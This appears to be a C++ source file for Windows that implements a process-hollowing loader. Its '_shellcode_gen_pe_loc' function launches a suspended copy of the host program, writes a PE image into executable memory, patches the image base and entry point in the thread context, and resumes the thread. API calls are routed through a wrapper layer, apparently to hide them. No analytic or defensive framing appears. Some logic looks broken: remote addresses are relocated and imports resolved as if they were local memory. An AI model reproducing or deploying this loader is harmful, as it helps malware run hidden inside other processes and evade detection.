#pragma once
#include "funcs.hpp"
#pragma region Process utilities
#pragma endregion
#pragma region Memory utilities
ubyte* _funcs::_loc_alloc(intl _base, intl _size, DWORD* _old_flags)
{
	ubyte* _ret = reinterpret_cast<ubyte*>(_api::__VirtualAlloc( lvoid(_base), _size,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	if (!_ret) {
		_ret = reinterpret_cast<ubyte*>(malloc(_size));
		if (!_ret) {
			return nullptr;
		}
	}
	if (!_api::__VirtualProtect(_ret, _size, PAGE_EXECUTE_READWRITE, _old_flags)) {
		free(_ret);
		return nullptr;
	}
	return _ret;
}
bool _funcs::_loc_img_reloc(handle _hdl, ubyte* _base, ubyte* _src, IMAGE_NT_HEADERS* _hdr)
{
	auto* _psh = IMAGE_FIRST_SECTION(_hdr);
	for (unsigned short i = 0; i < _hdr->FileHeader.NumberOfSections; ++i, ++_psh) {
		if (_psh->SizeOfRawData > 0) {
			if (!_api::__WriteProcessMemory(_hdl, _base + _psh->VirtualAddress, _src + _psh->PointerToRawData, _psh->SizeOfRawData, NULL)) {
				delete[] _src;
				free(_base);
				return false;
			}
		}
	}
	return true;
}
#pragma endregion
#pragma region Shellcode generation

#pragma endregion
int _funcs::_shellcode_gen_pe_loc(LPPROCESS_INFORMATION _pinf, LPSTARTUPINFOW _psi, LPVOID _img, LPWSTR _wargs, SIZE_T _argsz)
{
	WCHAR wszFilePath[MAX_PATH];
	if (!_api::__GetModuleFileNameW(NULL, wszFilePath, sizeof wszFilePath))
	{
		return -1;
	}
	WCHAR _host_pth[MAX_PATH + 4096];
	ZeroMemory(_host_pth, sizeof _host_pth);
	intl _len = wcslen(wszFilePath);
	memcpy(_host_pth, wszFilePath, _len * sizeof(WCHAR));
	_host_pth[_len] = ' ';
	memcpy(_host_pth + _len + 1, _wargs, _argsz);
	PIMAGE_DOS_HEADER _pdhdr = reinterpret_cast<PIMAGE_DOS_HEADER>(_img);
	PIMAGE_NT_HEADERS _pnthdr = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD64>(_img) + _pdhdr->e_lfanew);
	if (_pnthdr->Signature != IMAGE_NT_SIGNATURE){
		return -2;
	}
	if (!_api::__CreateProcessW(NULL, _host_pth, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, _psi, _pinf)){
		return -3;
	}
	CONTEXT _CTX;
	ZeroMemory(&_CTX, sizeof _CTX);
	_CTX.ContextFlags = CONTEXT_FULL;
	if (!_api::__GetThreadContext(_pinf->hThread, &_CTX)){
		_api::__TerminateProcess(_pinf->hProcess, -4);
		return -4;
	}
	LPVOID _imgbs = _api::__VirtualAllocEx(_pinf->hProcess, reinterpret_cast<LPVOID>(_pnthdr->OptionalHeader.ImageBase), _pnthdr->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (_imgbs == NULL){
		_api::__TerminateProcess(_pinf->hProcess, -5);
		return -5;
	}
	if (!_api::__WriteProcessMemory(_pinf->hProcess, _imgbs, _img, _pnthdr->OptionalHeader.SizeOfHeaders, NULL)){
		_api::__TerminateProcess(_pinf->hProcess, -6);
		return -6;
	}
	auto* _psh = IMAGE_FIRST_SECTION(_pnthdr);
	for (unsigned short i = 0; i < _pnthdr->FileHeader.NumberOfSections; ++i, ++_psh) {
		if (_psh->SizeOfRawData > 0) {
			if (!_api::__WriteProcessMemory(_pinf->hProcess,reinterpret_cast<lvoid>(intl(_imgbs) + _psh->VirtualAddress), reinterpret_cast<lvoid>(intl(_img) + _psh->PointerToRawData), _psh->SizeOfRawData, NULL)) {
				return false;
			}
		}
	}
	lvoid _locdelt = lvoid(intl(_imgbs) - _pnthdr->OptionalHeader.ImageBase);
	if (_locdelt) {
		if (!_pnthdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
		}
		else {
			unsigned int _iterations = 0x00000000L;
			PIMAGE_BASE_RELOCATION _rdat = PIMAGE_BASE_RELOCATION(lvoid(intl(_imgbs) + _pnthdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));
			while (_rdat->VirtualAddress) {
				UINT _amtent = UINT(_rdat->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				PWORD _relinf = PWORD(_rdat + 1);
				for (unsigned int i = 0; i < _amtent; ++i, ++_relinf) {
					if (RELOC_FLAG(*_relinf)) {
						intl* _patch = reinterpret_cast<intl*>(intl(_imgbs) + _rdat->VirtualAddress + ((*_relinf) & 0xFFF));
						*_patch += intl(_locdelt);
					}
				}
				_rdat = PIMAGE_BASE_RELOCATION(lvoid(intl(_rdat) + _rdat->SizeOfBlock));
				_iterations++;
			}
		}
	}
	if (_pnthdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
		auto* _piid = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(reinterpret_cast<ubyte*>(_img) + _pnthdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		int _iterations = 0x0000;
		while (_piid->Name) {
			char* _iname = reinterpret_cast<char*>(intl(_imgbs) + _piid->Name);
			HINSTANCE _hdl_dll = LoadLibraryA(_iname);
			PULONG_PTR _thunkrf = PULONG_PTR(intl(_imgbs) + _piid->OriginalFirstThunk);
			PULONG_PTR _frf = PULONG_PTR(intl(_imgbs) + _piid->FirstThunk);
			if (!_thunkrf) {
				_thunkrf = _frf;
			}
			for (; *_thunkrf; ++_thunkrf, ++_frf) {
				if (IMAGE_SNAP_BY_ORDINAL(*_thunkrf)) {
					*_thunkrf = reinterpret_cast<ULONG_PTR>(GetProcAddress(_hdl_dll, PCHAR(*_thunkrf & 0xFFFF)));
				}
				else {
					auto* _pimp = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(intl(_imgbs) + (*_thunkrf));
					*_frf = reinterpret_cast<ULONG_PTR>(GetProcAddress(_hdl_dll, _pimp->Name));
				}
			}
			++_piid;
			++_iterations;
		}
	}
	if (!_api::__WriteProcessMemory(_pinf->hProcess, reinterpret_cast<LPVOID>(_CTX.Rdx + sizeof(LPVOID) * 2), &_imgbs, sizeof(LPVOID), NULL)){
		_api::__TerminateProcess(_pinf->hProcess, -8);
		return -8;
	}
	_CTX.Rcx = reinterpret_cast<DWORD64>(_imgbs) + _pnthdr->OptionalHeader.AddressOfEntryPoint;
	if (!_api::__SetThreadContext(_pinf->hThread, &_CTX)){
		_api::__TerminateProcess(_pinf->hProcess, -9);
		return -9;
	}
	if (!_api::__ResumeThread(_pinf->hThread)){
		_api::__TerminateProcess(_pinf->hProcess, -10);
		return -10;
	}
	return 0;
}